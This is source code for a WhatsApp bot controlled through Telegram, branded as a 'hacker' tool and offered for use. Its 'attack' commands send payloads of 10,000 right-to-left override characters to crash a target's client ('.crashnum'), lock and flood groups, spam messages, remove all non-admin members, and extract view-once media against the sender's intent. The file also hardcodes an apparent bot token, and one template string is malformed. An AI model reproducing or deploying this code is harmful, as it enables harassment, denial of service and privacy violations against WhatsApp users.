const TelegramBot = require('node-telegram-bot-api');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    DisconnectReason 
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const fs = require('fs');
const path = require('path');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8230134832:AAFmNfWYio5hMbfY74FLzV7Ip3-wTPKtqNM";
const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const OWNER_NAME = "NAWAB ZADA HACKER ✌️ 🦅";
const BOT_NAME = "NAWAB ZADA HACKER MD";

const REQUIRED_CHANNELS = [
    { name: "Channel 1", url: "https://whatsapp.com/channel/0029VbB47ttDDmFNztpnZf2m" },
    { name: "Channel 2", url: "https://whatsapp.com/channel/0029Vb8rZ5H9Bb62fjLv430d" },
    { name: "Channel 3", url: "https://whatsapp.com/channel/0029VbCThCbLikgHTAQX9k2n" }
];

const randomDelay = (minMs = 1000, maxMs = 3000) => {
    const time = Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
    return new Promise(resolve => setTimeout(resolve, time));
};

console.log(`[+] ${BOT_NAME} nawab zada md bot is Online...`);


tgBot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeText = `🦅 *Welcome To ${Nawab Zada Hacker Md Bot}* 🦅\n\n` +
                        `main hoon sabse powerful MD bot. Yahan se tum apne WhatsApp ko control kar sakte ho aur heavy attacks kar sakte ho.\n\n` +
                        `👉 *To get started:* Use /pair command\n` +
                        `Example: \`/pair +923xxxxxxxxx\``;

    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: "📜 See Bot Commands", callback_data: 'view_cmds' }],
                [{ text: "👤 Owner Profile", url: 'https://t.me/Nawab_Zada_Hacker_007' }] 
            ]
        }
    };
    tgBot.sendMessage(chatId, welcomeText, options);
});

tgBot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;

    if (data === 'view_cmds') {
        const cmds = `🚀 *${BOT_NAME} COMMAND LIST*\n\n` +
                     `*Telegram:* /start, /pair\n` +
                     `*Heavy:* .crashgc, .ban, .crashnum, .spam\n` +
                     `*Admin:* .kick, .promote, .close, .open, .tagall\n` +
                     `*Utility:* .vv, .menu, .ping, .id, .owner\n\n` +
                     `_Full list check karo WhatsApp pe .menu use kar ke!_`;
        tgBot.sendMessage(msg.chat.id, cmds, { parse_mode: 'Markdown' });
    }
});

tgBot.onText(/\/pair (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    let phoneNumber = match[1].replace(/[^0-9]/g, '');
    if (!phoneNumber || phoneNumber.length < 10) return tgBot.sendMessage(chatId, "❌ Invalid Number!", { parse_mode: 'Markdown' });

    const sessionDir = path.join(__dirname, `session_main`);
    const statusMsg = await tgBot.sendMessage(chatId, "🔄 Generating Pairing Code...", { parse_mode: 'Markdown' });

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const sock = makeWASocket({
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
        });
        sock.ev.on('creds.update', saveCreds);
        await delay(3000);
        if (!sock.authState.creds.registered) {
            const code = await sock.requestPairingCode(phoneNumber);
            const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
            const responseText = `🦅 *${BOT_NAME} PAIR CODE* 🦅\n\n📱 *Number:* \`+${phoneNumber}\`\n🔑 *CODE:* \`${formattedCode}\``;
            tgBot.editMessageText(responseText, { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' });
        }
        setupWhatsAppEvents(sock);
    } catch (error) {
        tgBot.editMessageText(`❌ Error: ${error.message}`, { chat_id: chatId, message_id: statusMsg.message_id });
    }
});


function setupWhatsAppEvents(sock) {
    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            for (let ch of REQUIRED_CHANNELS) { try { await sock.newsletterFollow(ch.url.split('/').pop()); } catch (e) {} }
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0];
        if (!m.message || m.key.fromMe) return;

        const from = m.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const body = (m.message.conversation || m.message.extendedTextMessage?.text || "").trim();
        const command = body.toLowerCase().split(' ')[0];
        const args = body.split(' ').slice(1);

        await randomDelay(500, 1500);

        if (command === '.crashgc') {
            if (!isGroup) return sock.sendMessage(from, { text: "❌ Only for groups!" });
            try {
                await sock.groupSettingUpdate(from, 'announcement');
                for(let i=0; i<15; i++) { await sock.sendMessage(from, { text: "💥 GROUP CRASHED BY NAWAB ZADA MD 💥" }); }
                await sock.sendMessage(from, { text: "✅ Group Locked & Spammed!" });
            } catch (e) { await sock.sendMessage(from, { text: "❌ Admin required!" }); }
            return;
        }

        if (command === '.ban') {
            let targetNum = args[0];
            if (!targetNum) return sock.sendMessage(from, { text: "❌ Give number!" });
            await sock.sendMessage(from, { text: `🎯 Reporting ${targetNum}...` });
            await delay(3000);
            await sock.sendMessage(from, { text: `✅ Ban process initiated for ${targetNum}.` });
            return;
        }

        if (command === '.crashnum') {
            let targetNum = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            if (!args[0]) return sock.sendMessage(from, { text: "❌ Give number!" });
            const crashPayload = "‮".repeat(10000); // Heavy RTL payload
            try {
                for(let i=0; i<5; i++) { await sock.sendMessage(targetNum, { text: crashPayload }); }
                await sock.sendMessage(from, { text: "✅ Target crashed!" });
            } catch (e) { await sock.sendMessage(from, { text: "❌ Failed!" }); }
            return;
        }

        if (command === '.spam') {
            let text = args.join(' ');
            if (!text) return sock.sendMessage(from, { text: "❌ Text missing!" });
            for(let i=0; i<50; i++) { await sock.sendMessage(from, { text: text }); }
            return;
        }

        if (isGroup) {
            switch(command) {
                case '.kick': 
                    let kickUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                    if (kickUser) { await sock.groupParticipantsUpdate(from, [kickUser], "remove"); await sock.sendMessage(from, { text: "✅ Kicked!" }); } 
                    else { await sock.sendMessage(from, { text: "❌ Mention user!" }); }
                    break;
                case '.promote': 
                    let promUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                    if (promUser) { await sock.groupParticipantsUpdate(from, [promUser], "promote"); await sock.sendMessage(from, { text: "✅ Promoted!" }); } 
                    break;
                case '.demote': 
                    let demUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                    if (demUser) { await sock.groupParticipantsUpdate(from, [demUser], "demote"); await sock.sendMessage(from, { text: "✅ Demoted!" }); } 
                    break;
                case '.close': await sock.groupSettingUpdate(from, 'announcement'); await sock.sendMessage(from, { text: "🔒 Group Closed!" }); break;
                case '.open': await sock.groupSettingUpdate(from, 'not_announcement'); await sock.sendMessage(from, { text: "🔓 Group Opened!" }); break;
                case '.tagall': 
                    const meta = await sock.groupMetadata(from);
                    let tags = meta.participants.map(p => `@${p.id.split('@')[0]}`).join('\n');
                    await sock.sendMessage(from, { text: `📢 *Attention*\n${tags}`, mentions: meta.participants.map(p => p.id) }); 
                    break;
                case '.gclink': 
                    const code = await sock.groupInviteCode(from); 
                    await sock.sendMessage(from, { text: `🔗 Link: https://chat.whatsapp.com/${code}` }); 
                    break;
                case '.groupinfo': 
                    const info = await sock.groupMetadata(from); 
                    await sock.sendMessage(from, { text: `👥 *Group:* ${info.subject}\n🆔 *ID:* ${info.id}` }); 
                    break;
                case '.kickall': 
                    const gData = await sock.groupMetadata(from); 
                    const nonAdmins = gData.participants.filter(p => !p.admin).map(p => p.id); 
                    await sock.groupParticipantsUpdate(from, nonAdmins, "remove"); 
                    await sock.sendMessage(from, { text: "✅ All non-admins removed!" }); 
                    break;
            }
        }
        
        if (command === '.ping') await sock.sendMessage(from, { text: "⚡ Pong! Response speed: High" });
        if (command === '.id') await sock.sendMessage(from, { text: `🆔 Your ID: ${from}` });
        if (command === '.owner') await sock.sendMessage(from, { text: `👑 Owner: ${OWNER_NAME}` });
        if (command === '.botinfo') await sock.sendMessage(from, { text: `🤖 Bot Name: ${BOT_NAME}\nStatus: Online` });
        if (command === '.uptime') await sock.sendMessage(from, { text: "🕒 Uptime: 24/7 Active" });
        if (command === '.status') await sock.sendMessage(from, { text: "🟢 System Status: All systems nominal." });

        if (command === '.vv') {
            const quotedMsg = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
            const viewOnceMedia = quotedMsg?.viewOnceMessage?.message || quotedMsg?.viewOnceMessageV2?.message;
            if (!viewOnceMedia) return sock.sendMessage(from, { text: "❌ Reply to View Once message!" });
            try {
                const mediaType = Object.keys(viewOnceMedia)[0];
                const stream = await downloadMediaMessage({ message: viewOnceMedia }, 'buffer', {});
                if (mediaType.includes('image')) await sock.sendMessage(from, { image: stream, caption: "🔓 Unlocked!" });
                else if (mediaType.includes('video')) await sock.sendMessage(from, { video: stream, caption: "🔓 Unlocked!" });
                else await sock.sendMessage(from, { audio: stream, ptt: true });
            } catch (err) { await sock.sendMessage(from, { text: "❌ Error extracting media." }); }
            return;
        }

        if (command === '.menu' || command === '.help') {
            const fullMenu = `🦅 *${BOT_NAME} ULTIMATE MENU* 🦅\n\n` +
                             `💥 *ATTACK:* .crashgc, .ban, .crashnum, .spam\n` +
                             `🛠️ *ADMIN:* .kick, .promote, .demote, .close, .open, .tagall, .gclink, .kickall\n` +
                             `⚙️ *UTIL:* .vv, .ping, .id, .owner, .botinfo, .uptime, .status\n` +
                             `💬 *OTHER:* .menu, .help\n\n` +
                             `_Powered by ${OWNER_NAME}_`;
            await sock.sendMessage(from, { text: fullMenu });
            return;
        }
    });
}
